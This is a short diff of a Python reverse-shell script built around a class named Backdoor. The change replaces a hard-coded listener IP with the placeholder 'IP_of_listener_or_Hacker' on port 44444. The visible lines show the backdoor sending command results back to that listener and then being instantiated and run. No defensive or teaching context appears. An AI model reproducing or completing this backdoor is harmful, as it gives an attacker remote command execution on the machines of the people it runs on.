@@ -69,5 +69,5 @@ class Backdoor:
 			self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.225.54",44444)
+my_backdoor = Backdoor("IP_of_listener_or_Hacker",44444)
 my_backdoor.run()
